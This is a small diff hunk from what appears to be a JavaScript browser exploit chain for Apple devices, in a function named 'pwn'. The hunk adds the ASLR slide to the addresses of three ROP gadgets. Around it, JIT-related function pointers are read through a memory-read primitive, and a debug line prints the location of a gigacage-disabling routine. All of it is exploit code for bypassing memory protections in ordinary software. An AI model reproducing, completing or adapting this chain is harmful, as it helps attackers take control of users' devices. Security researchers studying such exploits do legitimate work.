@@ -266,9 +266,9 @@ var pwn = function() {
     jitWriteSeparateHeapsFunction = stage2.read64(_off.jit_writeseperateheaps_func + slide)
     useFastPermisionsJITCopy = stage2.read64(_off.usefastpermissions_jitcopy + slide)
     ptr_stack_check_guard = _off.ptr_stack_check_guard + slide;
-    pop_x8 = _off.modelio_popx8;
-    pop_x2 = _off.coreaudio_popx2;
-    linkcode_gadget = _off.linkcode_gadget;
+    pop_x8 = _off.modelio_popx8 + slide;
+    pop_x2 = _off.coreaudio_popx2 + slide;
+    linkcode_gadget = _off.linkcode_gadget + slide;
     
     if(verbosity >= VERBOSITY_HIGH) {
         print('disablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
